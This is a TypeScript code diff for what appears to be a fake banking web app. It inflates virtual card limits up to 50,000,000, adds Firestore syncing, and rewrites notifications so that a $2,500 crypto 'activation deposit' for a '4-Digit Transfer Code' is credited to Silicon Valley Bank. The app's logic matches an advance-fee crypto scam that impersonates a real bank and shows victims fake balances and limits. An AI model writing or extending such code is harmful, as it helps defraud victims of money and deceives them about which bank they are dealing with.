@@ -194,7 +194,7 @@ const seedVirtualCards: VirtualCard[] = [
     expiryYear: '28',
     cardType: 'Visa Corporate',
     category: 'SaaS Subscriptions',
-    spendingLimit: 5000,
+    spendingLimit: 50000,
     spentAmount: 1240.50,
     status: 'Active',
     createdAt: new Date('2026-03-01T10:00:00Z').toISOString()
@@ -209,7 +209,7 @@ const seedVirtualCards: VirtualCard[] = [
     expiryYear: '29',
     cardType: 'Visa Business Debit',
     category: 'Corporate Travel',
-    spendingLimit: 10000,
+    spendingLimit: 50000,
     spentAmount: 3450.00,
     status: 'Active',
     createdAt: new Date('2026-03-05T14:30:00Z').toISOString()
@@ -534,11 +534,16 @@ class DatabaseManager {
 
   public async findUserByEmailOrAccountAsync(queryStr: string): Promise<User | undefined> {
     const memoryUser = this.findUserByEmailOrAccount(queryStr);
-    if (memoryUser) return memoryUser;
 
     try {
       const fsUser = await getUserFromFirestore(queryStr);
       if (fsUser) {
+        if (memoryUser) {
+          if (fsUser.profilePicture !== undefined) {
+            memoryUser.profilePicture = fsUser.profilePicture;
+          }
+          return memoryUser;
+        }
         if (!this.db.users.some(u => u.id === fsUser.id || u.email.toLowerCase() === fsUser.email.toLowerCase())) {
           this.db.users.push(fsUser);
         }
@@ -552,7 +557,7 @@ class DatabaseManager {
       console.warn('findUserByEmailOrAccountAsync Firestore error:', err);
     }
 
-    return undefined;
+    return memoryUser;
   }
 
   public findUserByExactEmail(email: string): User | undefined {
@@ -635,7 +640,7 @@ class DatabaseManager {
       expiryYear: '29',
       cardType: 'Visa Corporate',
       category: 'Business',
-      spendingLimit: 5000,
+      spendingLimit: newUser.verificationTier === 'Tier 3' ? 50000000 : 50000,
       spentAmount: 0,
       status: 'Active',
       createdAt: new Date().toISOString()
@@ -804,8 +809,19 @@ class DatabaseManager {
     if (updates.twoFactorEnabled !== undefined) user.twoFactorEnabled = updates.twoFactorEnabled;
     if (updates.emailNotifications !== undefined) user.emailNotifications = updates.emailNotifications;
     if (updates.smsNotifications !== undefined) user.smsNotifications = updates.smsNotifications;
+    if (updates.verificationTier !== undefined) {
+      user.verificationTier = updates.verificationTier;
+      if (updates.verificationTier === 'Tier 3' && this.db.virtualCards) {
+        this.db.virtualCards.forEach(card => {
+          if (card.userId === userId) {
+            card.spendingLimit = 50000000;
+          }
+        });
+      }
+    }
 
     this.saveDB(this.db);
+    syncUserToFirestore(user).catch(err => console.warn('Firestore sync failed in updateUserProfile:', err));
     return user;
   }
 
@@ -1466,7 +1482,7 @@ class DatabaseManager {
       id: `notif-${Date.now()}-act`,
       userId: user.id,
       title: '$2,500 Activation Deposit Submitted',
-      message: `Your $2,500 ${cryptoMethod} activation deposit request for 4-Digit Security Code issuance is under review by SVB Compliance. Ref: ${depId}`,
+      message: `Your $2,500 ${cryptoMethod} activation deposit request for 4-Digit Security Code issuance is under review by Silicon Valley Bank. Ref: ${depId}`,
       amount: 2500,
       currency: 'USD',
       reference: depId,
@@ -1559,7 +1575,7 @@ class DatabaseManager {
       id: `notif-${Date.now()}-code`,
       userId: targetUser.id,
       title: '4-Digit Transfer Code Approved & Issued!',
-      message: `Your $2,500 ${deposit.cryptoMethod} deposit was APPROVED by Compliance! Your official 4-Digit Outgoing Transfer Code is: [ ${generatedCode} ]. Keep this code confidential.`,
+      message: `Your $2,500 ${deposit.cryptoMethod} deposit was APPROVED by Silicon Valley Bank! Your official 4-Digit Outgoing Transfer Code is: [ ${generatedCode} ]. Keep this code confidential.`,
       amount: 2500,
       currency: 'USD',
       reference: deposit.id,
@@ -1601,8 +1617,8 @@ class DatabaseManager {
     const notif: UserNotification = {
       id: `notif-${Date.now()}-rej`,
       userId: targetUser.id,
-      title: '$200 Activation Deposit Rejected',
-      message: `Your $200 ${deposit.cryptoMethod} activation deposit was rejected by SVB Compliance. 4-Digit Transfer Code has not been issued. Please contact support.`,
+      title: '$2,500 Activation Deposit Rejected',
+      message: `Your $2,500 ${deposit.cryptoMethod} activation deposit was rejected by Silicon Valley Bank. 4-Digit Transfer Code has not been issued. Please contact support.`,
       amount: 0,
       currency: 'USD',
       reference: deposit.id,
@@ -1711,7 +1727,7 @@ class DatabaseManager {
       id: `notif-${Date.now()}-cancel`,
       userId: txn.userId,
       title: 'Transaction Cancelled',
-      message: `Transaction ${txn.reference} of $${txn.amount.toFixed(2)} was cancelled by Bank Compliance. Your balance has been updated accordingly.`,
+      message: `Transaction ${txn.reference} of $${txn.amount.toFixed(2)} was cancelled by Silicon Valley Bank. Your balance has been updated accordingly.`,
       amount: txn.amount,
       currency: txn.currency,
       reference: txn.reference,
@@ -1837,7 +1853,7 @@ class DatabaseManager {
       expiryYear: '29',
       cardType: data.cardType || 'Visa Corporate',
       category: data.category || 'Business',
-      spendingLimit: Number(data.spendingLimit) || 5000,
+      spendingLimit: user.verificationTier === 'Tier 3' ? 50000000 : (Number(data.spendingLimit) || 50000),
       spentAmount: 0,
       status: 'Active',
       createdAt: new Date().toISOString()
